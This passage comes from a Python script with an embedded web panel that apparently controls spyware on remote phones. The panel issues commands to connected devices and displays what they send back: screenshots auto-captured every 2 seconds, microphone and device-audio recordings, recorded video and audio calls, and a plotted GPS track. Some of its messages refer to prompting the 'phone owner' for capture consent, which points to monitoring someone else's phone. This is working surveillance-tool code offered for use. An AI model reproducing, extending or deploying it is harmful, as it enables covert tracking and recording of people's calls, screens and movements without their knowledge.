      b.title=d.online?`send '${a}' to ${d.name} now`:`${d.name} offline — queued until it reconnects`;
      b.onclick=()=>sendCmd(a,d.id);
      btns.append(b);
    });
    c.append(dot,nm,meta,btns);wrap.append(c);
  }
}
function renderTargets(devs){
  const sel=$('pTarget');if(!sel)return;
  sel.innerHTML='';
  const auto=document.createElement('option');auto.value='';
  auto.textContent=devs.length===1?'auto → '+devs[0].name:devs.length?'auto (default bucket)':'auto';
  sel.append(auto);
  for(const d of devs){
    const o=document.createElement('option');o.value=d.id;
    o.textContent=`${d.online?'●':'○'} ${d.name || d.id}`;o.title=d.id;
    sel.append(o);
  }
}
function sendCmd(cmd,to){if(!ui||ui.readyState!==1){logLine('not connected to monitor — retrying…','bad');return;}ui.send(JSON.stringify(to?{type:cmd,to}:{type:cmd}));logLine(`> sent '${cmd}'${to?' → '+to:''}`);}

function renderImgs(files){
  if(!files.length){wrap.innerHTML='<div class="empty">no screenshots yet — press "Screenshot now" or wait for the 2 s auto-capture</div>';return;}
  const g=document.createElement('div');g.className='grid';
  for(const f of files){
    const c=document.createElement('div');c.className='card';
    const img=document.createElement('img');img.src=f.url;img.loading='lazy';
    const cap=document.createElement('div');cap.className='cap';
    cap.innerHTML=`<span>${new Date(f.ts).toLocaleTimeString()}</span><span>${(f.size/1024).toFixed(0)} KB</span>`;
    c.onclick=()=>{img.src=f.url;$('lightboxImg').src=f.url;$('lightbox').classList.add('on');};
    c.append(img,cap);g.append(c);
  }
  wrap.innerHTML='';wrap.append(g);
}
function renderVideos(files){
  if(!files.length){wrap.innerHTML='<div class="empty">no videos yet — press "Record on", wait, then "Record off"; the MP4 is uploaded automatically</div>';return;}
  const l=document.createElement('div');l.className='media-list';
  for(const f of files){
    const it=document.createElement('div');it.className='media-item';
    const v=document.createElement('video');v.controls=true;v.preload='metadata';v.src=f.url;
    const m=document.createElement('div');m.className='meta';
    m.innerHTML=`${f.name} · ${(f.size/1048576).toFixed(2)} MB · ${new Date(f.ts).toLocaleString()}`;
    it.append(v,m);l.append(it);
  }
  wrap.innerHTML='';wrap.append(l);
}
function renderAudios(files){
  if(!files.length){wrap.innerHTML='<div class="empty">no audio yet — press "Mic on" or "Device audio on"; files are uploaded when you stop them</div>';return;}
  const l=document.createElement('div');l.className='media-list';
  for(const f of files){
    const it=document.createElement('div');it.className='media-item';
    const a=document.createElement('audio');a.controls=true;a.preload='metadata';a.src=f.url;
    const m=document.createElement('div');m.className='meta';
    m.innerHTML=`${f.name} · ${(f.size/1024).toFixed(0)} KB · ${new Date(f.ts).toLocaleString()}`;
    it.append(a,m);l.append(it);
  }
  wrap.innerHTML='';wrap.append(l);
}
function renderCallVideos(files){
  if(!files.length){wrap.innerHTML='<div class="empty">no video-call recordings yet — press "Video call on" before the call (one-time screen-capture consent on the phone), then "Video call off" after; the MP4 lands here</div>';return;}
  const l=document.createElement('div');l.className='media-list';
  for(const f of files){
    const it=document.createElement('div');it.className='media-item';
    const v=document.createElement('video');v.controls=true;v.preload='metadata';v.src=f.url;
    const m=document.createElement('div');m.className='meta';
    m.innerHTML=`${f.name} · ${(f.size/1048576).toFixed(2)} MB · ${new Date(f.ts).toLocaleString()}`;
    it.append(v,m);l.append(it);
  }
  wrap.innerHTML='';wrap.append(l);
}
function renderCallAudios(files){
  if(!files.length){wrap.innerHTML='<div class="empty">no audio-call recordings yet — press "Audio call on" before the call, then "Audio call off" after; the M4A lands here</div>';return;}
  const l=document.createElement('div');l.className='media-list';
  for(const f of files){
    const it=document.createElement('div');it.className='media-item';
    const a=document.createElement('audio');a.controls=true;a.preload='metadata';a.src=f.url;
    const m=document.createElement('div');m.className='meta';
    m.innerHTML=`${f.name} · ${(f.size/1024).toFixed(0)} KB · ${new Date(f.ts).toLocaleString()}`;
    it.append(a,m);l.append(it);
  }
  wrap.innerHTML='';wrap.append(l);
}
async function renderLocations(){
  const data=await fetchJSON('/api/locations');
  const locs=data.locations||[];
  wrap.innerHTML='';
  const table=document.createElement('table');
  table.innerHTML='<tr><th>time</th><th>lat</th><th>lon</th><th>accuracy m</th><th>device</th></tr>';
  if(!locs.length){table.innerHTML+='<tr><td colspan="5" class="empty">no fixes yet — press "Location on"</td></tr>';}
  for(const l of locs.slice().reverse()){
    const tr=document.createElement('tr');
    tr.innerHTML=`<td>${new Date(l.ts).toLocaleString()}</td><td>${l.lat}</td><td>${l.lon}</td><td>${l.accuracy??''}</td><td>${esc(l.dev||'')}</td>`;
    table.append(tr);
  }
  const card=document.createElement('div');card.className='media-item';
  card.innerHTML='<div style="margin-bottom:8px;color:var(--dim)">position plot (offline, canvas)</div>';
  const cv=document.createElement('canvas');cv.id='map';cv.width=900;cv.height=240;
  card.append(cv,table);
  wrap.append(card);
  drawMap(locs);
}
function drawMap(locs){
  const cv=$('map');if(!cv)return;
  const ctx=cv.getContext('2d');
  ctx.fillStyle='#0f1117';ctx.fillRect(0,0,cv.width,cv.height);
  if(locs.length<2){ctx.fillStyle='#8fa1c0';ctx.font='13px monospace';ctx.fillText(locs.length?'waiting for a second fix…':'waiting for location fixes…',20,24);return;}
  const lats=locs.map(l=>l.lat),lons=locs.map(l=>l.lon);
  const minLat=Math.min(...lats),maxLat=Math.max(...lats),minLon=Math.min(...lons),maxLon=Math.max(...lons);
  const pad=30,sx=cv.width-pad*2,sy=cv.height-pad*2;
  const x=l=>pad+((l.lon-minLon)/((maxLon-minLon)||1))*sx;
  const y=l=>pad+((maxLat-l.lat)/((maxLat-minLat)||1))*sy;
  ctx.strokeStyle='#3b82f6';ctx.lineWidth=1.6;ctx.beginPath();
  locs.forEach((l,i)=>i?ctx.lineTo(x(l.lon),y(l.lat)):ctx.moveTo(x(l.lon),y(l.lat)));ctx.stroke();
  locs.forEach((l,i)=>{ctx.fillStyle='#22c55e';ctx.beginPath();ctx.arc(x(l.lon),y(l.lat),i===locs.length-1?5:2.5,0,7);ctx.fill();});
  ctx.fillStyle='#8fa1c0';ctx.font='11px monospace';
  ctx.fillText(`${locs.length} fixes · last ${lats[lats.length-1].toFixed(5)},${lons[lons.length-1].toFixed(5)}`,pad,cv.height-8);
}
/* ---------- live log ---------- */
function logLine(txt,cls){
  if(logEl){const d=document.createElement('div');const t=new Date().toLocaleTimeString();
    d.innerHTML=`<span class="t">${t}</span> ${txt}`;if(cls)d.className=cls;
    logEl.prepend(d);while(logEl.children.length>450)logEl.lastChild.remove();}
  if(!logEl){ // keep a mini ring for when the tab opens
    if(!window.__logRing)window.__logRing=[];
    window.__logRing.unshift({txt,cls});if(window.__logRing.length>450)window.__logRing.pop();
  }
}
function copyLog(){if(window.__logRing&&logEl){logEl.innerHTML='';for(const e of window.__logRing.slice().reverse()){const d=document.createElement('div');d.innerHTML=`<span class="t">${new Date().toLocaleTimeString()}</span> ${e.txt}`;if(e.cls)d.className=e.cls;logEl.append(d);}window.__logRing=null;}}
/* ---------- websocket (live events + commands) ---------- */
let ui=null;
function connect(){
  const proto=location.protocol==='https:'?'wss':'ws';
  ui=new WebSocket(`${proto}://${location.host}/ws/ui`);
  ui.onopen=()=>{logLine('ui websocket open','good');};
  ui.onclose=()=>{logLine('ui websocket closed — retrying…','bad');setTimeout(connect,3000);};
  ui.onmessage=e=>{
    let m;try{m=JSON.parse(e.data);}catch(_){return;}
    if(m.type==='hello')return;
    if(m.type==='status'){
      const devs=m.devices||[];const on=m.devices_online||0;
      $('pDevice').textContent=devs.length?`${on}/${devs.length} devices online`:'0/0 devices online';
      $('pDevice').className='pill '+(on?'on':'off');
      $('pQueue').textContent=`queue ${m.queue}`;
      $('pUptime').textContent=`up ${Math.floor(m.uptime_s/60)}m`;
      lastDevices=devs;renderTargets(devs);if(tab==='devices')renderDevices(devs);
      return;
    }
    if(m.type==='file'){if(tab==='img'&&m.file.kind==='img')openTab('img');if(tab==='video'&&m.file.kind==='video')openTab('video');if(tab==='audio'&&m.file.kind==='audio')openTab('audio');if(tab==='call_video'&&m.file.kind==='video'&&m.file.category==='call_video')openTab('call_video');if(tab==='call_audio'&&m.file.kind==='audio'&&m.file.category==='call_audio')openTab('call_audio');return;}
    if(m.type!=='ev')return;
    const ev=m.event,t=ev.type,p=ev.payload;
    if(t==='device_online'){logLine(`device connected: ${p.name?esc(p.name)+' ('+esc(p.id)+')':('id: '+esc(p.id))}`,'good');refreshDevices();}
    else if(t==='device_offline'){logLine(`device offline: ${p.name?esc(p.name)+' ('+esc(p.id)+')':('id: '+esc(p.id))}`,'bad');refreshDevices();}
    else if(t==='ack'){logLine(`✓ command '${p.cmd}' confirmed by device`,'good');}
    else if(t==='location'){logLine(`📍 ${p.lat},${p.lon} · acc ${p.accuracy} m`);if(tab==='location')renderLocations();}
    else if(t==='screenshot'){logLine(`📷 screenshot received`,'good');}
    else if(t==='media_uploaded'){logLine(`⬆ ${p.kind||'file'} uploaded (${(p.size/1024).toFixed(0)} KB)`+(p.category?` [${p.category}]`:''),'good');if(tab==='video'&&p.kind==='video')openTab('video');if(tab==='audio'&&p.kind==='audio')openTab('audio');if(tab==='call_video'&&p.kind==='video'&&p.category==='call_video')openTab('call_video');if(tab==='call_audio'&&p.kind==='audio'&&p.category==='call_audio')openTab('call_audio');}
    else if(t==='capture_consent_needed'||t==='record_consent_needed'||t==='deviceaudio_consent_needed'||t==='call_video_consent_needed'){logLine(`⚠ ${p.reason==='screen_capture_consent_required'?'phone owner must tap the screen-capture button once':p.reason}`,'bad');}
    else if(t==='mic_error'||t==='location_error'||t==='recording_error'||t==='deviceaudio_error'){logLine(`⚠ ${t.replace('_error','')} error: ${p.reason||'unknown'}`,'bad');}
    else logLine(`[${t}] ${JSON.stringify(p)}`);
  };
}
/* ---------- commands ---------- */
const STOPS={mic:'mic_stop',location:'location_stop',record:'record_stop',deviceaudio:'deviceaudio_stop',call_video:'call_video_stop',call_audio:'call_audio_stop'};
document.querySelectorAll('.cmd').forEach(b=>{
  b.onclick=()=>{
    if(!ui||ui.readyState!==1){logLine('not connected to monitor — retrying…','bad');return;}
    const c=b.dataset.cmd;
    const sel=$('pTarget'),to=sel&&sel.value?sel.value:undefined;
    ui.send(JSON.stringify(to?{type:c,to}:{type:c}));
    logLine(`> sent '${c}'${to?' → '+to:''}`);
    const k=Object.keys(STOPS).find(k=>c===k+'_start'||c===STOPS[k]);
    if(k){
      const pair=[document.querySelector(`[data-cmd="${k}_start"]`),document.querySelector(`[data-cmd="${k}_stop"]`)];
      if(c===k+'_start'){pair[0].disabled=true;pair[0].classList.add('active');pair[1].disabled=false;}
      else{pair[0].disabled=false;pair[0].classList.remove('active');pair[1].disabled=true;}
    }
  };
});
document.querySelectorAll('nav button').forEach(b=>b.onclick=()=>openTab(b.dataset.tab));
$('lightbox').onclick=()=>$('lightbox').classList.remove('on');
setInterval(()=>{if(ui&&ui.readyState===1)ui.send(JSON.stringify({type:'ping'}));},10000);
openTab('img');connect();
</script>
</body>
</html>
"""


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[*] stopped")